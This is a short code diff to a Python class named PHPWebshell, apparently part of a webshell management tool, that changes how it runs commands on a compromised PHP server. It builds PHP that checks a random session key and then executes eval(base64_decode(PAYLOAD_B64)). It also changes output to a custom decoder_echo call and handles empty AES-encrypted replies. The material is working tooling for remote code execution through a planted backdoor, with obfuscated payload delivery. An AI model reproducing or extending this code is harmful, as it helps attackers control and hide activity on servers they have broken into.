@@ -709,7 +709,7 @@ class PHPWebshell(PHPSessionInterface):
         @functools.wraps(submitter)
         async def wrap(payload: str) -> str:
             session_name = f"replay_key_{uuid.uuid4()}"
-            key = await submitter(f"echo($_SESSION[{session_name!r}]=rand()%10000);")
+            key = await submitter(f"decoder_echo(($_SESSION[{session_name!r}]=rand()%10000).'');")
             try:
                 key = int(key)
             except Exception as exc:
@@ -723,7 +723,7 @@ class PHPWebshell(PHPSessionInterface):
                 eval(base64_decode(PAYLOAD_B64));
                 unset($_SESSION[SESSION_NAME]);
             }else{
-                echo "WRONG_BAD_KEY";
+                decoder_echo("WRONG_BAD_KEY");
             }
             """.replace(
                     "SESSION_NAME", repr(session_name)
@@ -818,6 +818,8 @@ class PHPWebshell(PHPSessionInterface):
             )
             if result_enc == "WRONG_NO_OPENSSL":
                 raise exceptions.UnknownError("目标不支持openssl")
+            if not result_enc:
+                return ""
             try:
                 result_enc = base64.b64decode(result_enc)
                 result = decrypt_aes256_cbc(key, result_enc).decode("utf-8")
